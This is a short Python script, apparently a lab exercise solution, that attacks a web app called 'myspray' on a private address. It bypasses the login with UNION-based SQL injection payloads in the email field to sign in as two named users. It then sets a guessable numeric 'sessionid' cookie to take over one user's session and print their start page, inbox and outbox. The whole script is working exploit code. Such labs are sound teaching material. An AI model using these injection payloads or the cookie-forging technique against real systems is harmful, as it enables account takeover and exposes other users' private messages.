import requests

url = "http://10.0.23.22/myspray/"

# Hanni Ball's session:
s0 = requests.Session()
r0 = s0.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})

# N. O'Brian's session:
s1 = requests.Session()
r1 = s1.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})

# The server differentiates both sessions by setting the cookie 'sessionid'. This id can be easily found out by looking at the user profile's
# URL. Hanni Ball's id is 92 ("profile92.html") and N. O'Brian's is 96 ("profile96.html").

# Clear Hanni Ball's cookies.
s0.cookies.clear()

# Send a request from Hanni Ball's session, but setting the cookie as N. O'Brian's id. The server will display N. O'Brian's start page, and
# Hanni Ball will be able to see the other user's "You have been sprayed by" list.
r0 = s0.get(url + "start.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r0.content)

# Access N. O'Brian's inbox as Hanni Ball.
r0 = s0.get(url + "inbox.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r0.content)

# Access N. O'Brian's outbox as Hanni Ball.
r0 = s0.get(url + "outbox.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r0.content)
